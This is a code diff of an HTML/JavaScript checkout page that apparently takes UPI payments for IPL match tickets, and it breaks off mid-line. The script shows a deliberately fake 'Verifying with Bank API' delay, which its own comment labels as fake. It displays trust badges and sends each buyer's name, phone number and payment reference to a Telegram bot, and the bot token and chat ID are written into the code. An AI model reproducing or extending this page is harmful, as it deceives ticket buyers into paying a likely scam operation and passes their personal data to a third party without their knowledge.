@@ -27,14 +27,14 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         
-        body { font-family: 'Inter', sans-serif; background: #eef2f6; margin: 0; padding: 20px 15px 120px 15px; text-align: center; color: #111827; -webkit-font-smoothing: antialiased; }
+        body { font-family: 'Inter', sans-serif; background: #eef2f6; margin: 0; padding: 20px 15px 120px 15px; text-align: center; color: #111827; }
         
         /* ⏳ Timer Banner */
         .timer-banner { background: #fffbe6; color: #d68100; padding: 10px 15px; font-size: 13px; font-weight: 700; border-radius: 50px; max-width: max-content; margin: 0 auto 20px auto; border: 1px solid #ffe58f; display: flex; align-items: center; gap: 8px; box-shadow: 0 4px 12px rgba(214, 129, 0, 0.1); }
         .timer-banner svg { width: 16px; height: 16px; }
 
         /* Main Card */
-        .checkout-box { background: #fff; max-width: 420px; margin: auto; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.06); border: 1px solid #f3f4f6; position: relative; }
+        .checkout-box { background: #fff; max-width: 420px; margin: auto; border-radius: 20px; overflow: hidden; box-shadow: 0 20px 40px rgba(0,0,0,0.06); border: 1px solid #f3f4f6; position: relative;}
         
         /* Header */
         .checkout-header { background: linear-gradient(135deg, #0052FF 0%, #0036b3 100%); color: #fff; padding: 24px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); }
@@ -44,7 +44,7 @@
         /* Sleek Order Summary */
         .summary-toggle { background: #f8fafc; padding: 12px 20px; font-size: 13px; font-weight: 600; color: #475569; display: flex; justify-content: space-between; cursor: pointer; border-bottom: 1px solid #e2e8f0; transition: 0.2s; }
         .summary-toggle:hover { background: #f1f5f9; }
-        .summary-toggle span#arrow { transition: transform 0.3s ease; font-size: 10px; }
+        .summary-toggle span#arrow { transition: transform 0.3s ease; }
         .summary-details { display: none; background: #f8fafc; padding: 15px 20px; border-bottom: 1px solid #e2e8f0; text-align: left; font-size: 13px; color: #334155; }
         .s-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
         .s-row:last-child { margin-bottom: 0; }
@@ -55,16 +55,14 @@
         .steps-box span { font-weight: 700; color: #0052FF; background: #eff6ff; padding: 2px 6px; border-radius: 4px; font-size: 11px; margin-right: 4px; }
 
         /* QR Section */
-        .qr-section { padding: 15px 20px 20px; }
+        .qr-section { padding: 15px 20px 25px; }
         
-        /* 📸 QR Viewfinder Animation (100% Screenshot Safe) */
+        /* 📸 Safe Corner Viewfinder Animation (No Green Line) */
         .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 1px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.03); overflow: hidden; display: none;}
-        #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; position: relative; z-index: 1; }
+        #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; position: relative; z-index: 1;}
         
-        /* Viewfinder Corners */
         .qr-viewfinder { position: absolute; inset: 0; padding: 10px; z-index: 2; pointer-events: none; }
         .corner { position: absolute; width: 25px; height: 25px; border-color: #00cf7f; border-style: solid; animation: pulse-corners 2s infinite; }
-        
         .top-left { top: 15px; left: 15px; border-width: 4px 0 0 4px; border-radius: 6px 0 0 0; }
         .top-right { top: 15px; right: 15px; border-width: 4px 4px 0 0; border-radius: 0 6px 0 0; }
         .bottom-left { bottom: 15px; left: 15px; border-width: 0 0 4px 4px; border-radius: 0 0 0 6px; }
@@ -84,8 +82,8 @@
         .btn-action svg { width: 14px; height: 14px; }
 
         /* Trust Logos */
-        .trust-logos { margin-top: 25px; display: flex; justify-content: center; align-items: center; gap: 20px; }
-        .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.4; transition: 0.3s; }
+        .trust-logos { margin-top: 25px; display: flex; justify-content: center; align-items: center; gap: 18px; }
+        .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.5; transition: 0.3s; }
         .trust-logos img:hover { filter: grayscale(0%); opacity: 1; }
 
         /* Floating Label UTR Box */
@@ -101,7 +99,7 @@
         .error-msg { color: #ef4444; font-size: 12px; margin-top: 8px; display: none; font-weight: 600; display: flex; align-items: center; gap: 5px;}
 
         /* Modern Pay Button */
-        .pay-now-btn { width: 100%; padding: 18px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; outline: none;}
+        .pay-now-btn { width: 100%; padding: 18px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; }
         .pay-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.3); }
         .pay-now-btn.active:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 207, 127, 0.4); }
         .pay-now-btn.loading { background: #0052FF; cursor: wait; pointer-events: none; }
@@ -113,7 +111,7 @@
         .strict-warning { font-size: 11px; color: #64748b; text-align: center; margin-top: 16px; font-weight: 500; background: #f8fafc; padding: 10px; border-radius: 8px; border: 1px solid #e2e8f0; }
 
         /* Security Badges */
-        .secured-by { padding: 30px 15px 15px 15px; display: flex; justify-content: center; gap: 20px; font-size: 12px; color: #94a3b8; font-weight: 600; }
+        .secured-by { margin-top: 25px; display: flex; justify-content: center; gap: 20px; font-size: 12px; color: #94a3b8; font-weight: 600; }
         .secured-by div { display: flex; align-items: center; gap: 6px; }
     </style>
 </head>
@@ -210,38 +208,33 @@
     </div>
 
     <script>
-        // Global UI Variable safe definition
-        window.currentUpiId = ""; 
+        // Global variables for buttons
+        window.currentUpiId = "";
 
-        // 1. Timer Logic
+        // --- ⏳ TIMER LOGIC ---
         let timeLeft = 300; 
         const timerEl = document.getElementById('timer');
-        setInterval(() => {
-            if(timeLeft <= 0) { timerEl.innerText = "00:00"; return; }
+        let timerId = setInterval(() => {
+            if(timeLeft <= 0) {
+                clearInterval(timerId);
+                timerEl.innerText = "00:00";
+                return;
+            }
             timeLeft--;
             let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
             let s = (timeLeft % 60).toString().padStart(2, '0');
             timerEl.innerText = m + ':' + s;
         }, 1000);
 
-        // 2. Load Details Safely (Error-Proof)
+        // --- ORDER SUMMARY LOGIC ---
         const finalPrice = localStorage.getItem('finalPrice') || 0;
-        let matchTitle = "IPL Match Ticket";
-        
-        try {
-            const savedMatch = localStorage.getItem('selectedMatch');
-            if(savedMatch) {
-                const parsedMatch = JSON.parse(savedMatch);
-                if(parsedMatch && parsedMatch.title) matchTitle = parsedMatch.title;
-            }
-        } catch(e) { console.log("Match title parse safe fallback"); }
+        const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
         
         document.getElementById('p-amt').innerText = "₹" + finalPrice;
         document.getElementById('s-match').innerText = matchTitle;
         document.getElementById('s-total').innerText = "₹" + finalPrice;
 
-        // 3. View Summary Dropdown
-        window.toggleSummary = function() {
+        function toggleSummary() {
             const details = document.getElementById('summary-details');
             const arrow = document.getElementById('arrow');
             if(details.style.display === 'block') {
@@ -253,32 +246,36 @@
             }
         }
 
-        // 4. Utility Functions (Copy/Save)
-        window.copyUPI = function() {
+        // --- 📋 UTILITY LOGIC (Copy & Save) ---
+        function copyUPI() {
             if (!window.currentUpiId) return;
             navigator.clipboard.writeText(window.currentUpiId).then(() => {
                 const msgEl = document.getElementById('upi-copied-msg');
-                msgEl.innerText = "UPI ID Copied!";
+                msgEl.innerText = "UPI ID Copied to Clipboard!";
                 msgEl.style.display = 'block';
                 setTimeout(() => { msgEl.style.display = 'none'; }, 2000);
-            }).catch(() => alert("Failed to copy."));
+            }).catch(err => {
+                alert("Failed to copy UPI. Please copy manually.");
+            });
         }
 
-        window.downloadQR = function() {
+        function downloadQR() {
             const qrImg = document.getElementById('qr-code');
             const url = qrImg.src;
-            if (!url) return;
+            if (!url || url === "") {
+                alert("Please wait for QR to load.");
+                return;
+            }
             const a = document.createElement('a');
             a.href = url;
-            a.target = '_blank';
-            a.download = `Secure_QR.png`; 
+            a.download = `Secure_QR_${Date.now()}.png`; 
             document.body.appendChild(a);
             a.click();
             document.body.removeChild(a);
         }
 
-        // 5. Check UTR Field
-        window.checkUTR = function() {
+        // --- UTR VALIDATION LOGIC ---
+        function checkUTR() {
             const val = document.getElementById('utr').value;
             const btn = document.getElementById('pay-btn');
             const errorMsg = document.getElementById('utr-error');
@@ -296,8 +293,7 @@
             }
         }
 
-        // 6. Submit Payment & Telegram Alert
-        window.submitPayment = function() {
+        function submitPayment() {
             const val = document.getElementById('utr').value;
             const errorMsg = document.getElementById('utr-error');
             const utrInput = document.getElementById('utr');
@@ -305,11 +301,12 @@
             const btnLoader = document.getElementById('btn-loader');
             const btnText = document.getElementById('btn-text');
 
+            // 🔥 SMART ANTI-FRAUD UTR CHECK 🔥
             let isFake = false;
             if(val.length !== 12) isFake = true;
             else if(val.startsWith('0')) isFake = true;
             else if(/^(\d)\1{11}$/.test(val)) isFake = true;
-            else if(val === '123456789012' || val === '098765432109') isFake = true;
+            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isFake = true;
 
             if(isFake) {
                 errorMsg.style.display = 'flex';
@@ -318,16 +315,16 @@
                 errorMsg.style.display = 'none';
                 localStorage.setItem('userUTR', val); 
 
-                // Show Fake Verification API Loader
+                // ⏳ FAKE API DELAY
                 btn.classList.remove('active');
                 btn.classList.add('loading');
                 btnText.innerText = "Verifying with Bank API...";
                 btnLoader.style.display = "block";
 
                 setTimeout(() => {
-                    // TELEGRAM ALERT
+                    // --- ✈️ TELEGRAM UTR ALERT ---
                     const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                    const chatId = "YOUR_CHAT_ID"; // 👈 YAHAN APNI CHAT ID DAALEIN
+                    const chatId = "6820660513"; 
                     
                     const name = localStorage.getItem('customerName') || 'N/A';
                     const phone = localStorage.getItem('customerPhone') || 'N/A';
@@ -360,4 +357,9 @@
         import { db, ref, onValue } from "./js/firebase.js";
 
         const price = localStorage.getItem('finalPrice') || 0;
-        const qrImg = document.getElementByI
+        const qrImg = document.getElementById('qr-code');
+        const qrMsg = document.getElementById('qr-msg');
+        const qrWrapper = document.getElementById('qr-wrapper');
+        const qrActions = document.getElementById('qr-actions-box'); // Utility buttons wrapper
+
+        t
